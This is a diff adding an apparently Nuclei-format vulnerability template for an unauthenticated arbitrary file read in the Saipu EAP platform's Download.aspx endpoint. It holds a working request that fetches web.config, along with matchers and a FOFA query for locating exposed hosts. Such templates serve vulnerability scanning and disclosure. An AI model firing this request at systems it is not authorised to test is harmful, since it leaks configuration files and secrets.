@@ -1,0 +1,25 @@
+id: saipu-eap-Download-fileread
+info:
+  name: 赛普 EAP 企业适配管理平台 Download.aspx - fileread
+  author: leadlife
+  severity: high
+  description: 赛普EAP企业适配管理平台 Download.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统文件，造成信息泄露。
+  reference: 
+    - https://mp.weixin.qq.com/s/1VDqzKUMDo2UA_7_SvICQw
+    - https://github.com/wy876/POC/blob/61b2bf45a165e027ea7014e0bd153f5bf1108b61/%E8%B5%9B%E6%99%AE/%E8%B5%9B%E6%99%AEEAP%E4%BC%81%E4%B8%9A%E9%80%82%E9%85%8D%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0Download.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="IDWebSoft/"
+  tags: saipu,eap,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle=webconfig.txt"
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'configuration','xml version')
+        condition: and
